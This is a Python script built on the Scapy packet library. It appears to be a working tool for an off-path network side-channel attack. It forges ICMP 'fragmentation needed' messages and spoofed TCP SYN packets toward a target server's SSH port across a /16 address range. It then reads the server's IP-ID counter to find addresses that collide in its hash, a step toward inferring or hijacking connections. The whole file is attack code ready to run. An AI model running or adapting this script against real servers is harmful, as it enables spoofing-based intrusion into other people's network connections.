# coding=utf-8

import struct
import threading
import time
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *

server_ip = '10.10.100.2'
my_if_name = 'ens33'
attacker_ip = get_if_addr(my_if_name)
z_payload = b''

N_THREAD = 5
BLOCK = 100
sleep_time = 0.5

semaphore_ipid = threading.Semaphore(1)
semaphore = threading.Semaphore(1)

task_list = []
net_work_num = '20.0.0.0'
start_point = int(socket.inet_aton(net_work_num).encode('hex'), 16)
current_point = start_point
end_point = start_point + (1 << 16) - 1
stop = False
result = []

MX = 2

class Task:
    def __init__(self, addr, count=0, l_time=0.0):
        self.addr = addr
        self.count = count
        self.l_time = l_time

    def __cmp__(self, other):
        return self.count > other.count

    def __eq__(self, other):
        return self.addr == other.addr

    def __hash__(self):
        return hash(self.addr)


def check_new_list(list_d):
    C = len(list_d)
    icmp_seq = random.randint(0, (1 << 16) - 1)

    send_list = []
    for d in list_d:
        send_list.append(IP(src=attacker_ip, dst=server_ip) /
                         ICMP(type=3, code=4, nexthopmtu=68) /
                         IP(flags=2, src=server_ip, dst=inet_ntoa(struct.pack('I',socket.htonl(d)))) /
                         ICMP(type=0, code=0) /
                         z_payload)

    send_list.append(IP(src=attacker_ip, dst=server_ip) / ICMP(id=icmp_seq))
    for d in list_d:
        send_list.append(IP(src=inet_ntoa(struct.pack('I', socket.htonl(d))), dst=server_ip) /
                         TCP(sport=RandShort(), dport=22, flags='S'))
        send_list.append(IP(src=attacker_ip, dst=server_ip) / ICMP(id=icmp_seq))

    while True:
        semaphore_ipid.acquire()
        pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + attacker_ip,
                     iface=my_if_name, count=1 + C, timeout=2, started_callback=
                     lambda: send(send_list, iface=my_if_name, verbose=False))
        semaphore_ipid.release()
        if len(pkts) != 1 + C:
            time.sleep(sleep_time)
        else:
            break

    ipids = []
    for pk in pkts:
        ipids.append(pk[1].fields['id'])

    next = []
    for i in range(1, C + 1):
        if ipids[i] - ipids[i - 1] >= 2:
            next.append(list_d[i - 1])

    return next


def check_task_new_block():
    global result
    global stop
    global current_point
    global task_list

    d_set = set()
    d_list = []
    semaphore.acquire()
    task_set = set(task_list)
    ls = list(task_set)

    for di in ls:
        task_set.remove(di)
        d_list.append(di.addr)
        d_set.add(di)
        if len(d_list) == BLOCK:
            break

    task_list = list(task_set)

    if len(d_list) == BLOCK:
        list_d = d_list
        semaphore.release()
    else:
        s_p = current_point
        current_point += BLOCK - len(d_list)
        current_point = min(end_point, current_point)
        e_p = current_point
        if current_point == end_point:
            stop = True
        semaphore.release()

        list_d = list(range(s_p, e_p))
        list_d.extend(d_list)
        print('checking: ' + inet_ntoa(struct.pack('I',socket.htonl(s_p))) + ' - ' +
              inet_ntoa(struct.pack('I',socket.htonl(e_p))))

    ipid_next = check_new_list(list_d)

    if len(ipid_next) != 0:
        add_task_new = []
        add_task = set()
        add_set = []

        for d in ipid_next:
            if Task(d) in d_set:
                add_task.add(d)
            else:
                add_task_new.append(d)

        for d in add_task_new:
            add_set.append(Task(d, 1))

        for dt in d_set:
            if dt.addr in add_task:
                if dt.count == MX - 1:
                    found_str = inet_ntoa(struct.pack('I',socket.htonl(dt.addr)))
                    semaphore.acquire()
                    result.append(found_str)
                    semaphore.release()
                    print('--Found Collisison ' + str(len(result)) + ': ' + str(found_str))

                add_set.append(Task(dt.addr, dt.count + 1))

        semaphore.acquire()
        task_list.extend(add_set)
        semaphore.release()


def check_template():
    global stop

    if stop:
        return
    else:
        check_task_new_block()

    # start new thread
    t = threading.Thread(target=check_template)
    t.start()


if __name__ == '__main__':
    # construct padding payload
    for i in range(0, 520):
        z_payload += struct.pack('B', 0)

    # create sub-threads
    for i in range(0, N_THREAD):
        t = threading.Thread(target=check_template, name=('T' + str(i)))
        t.start()
        time.sleep(0.1)
        print('Num_' + str(i) + ' thread started.')
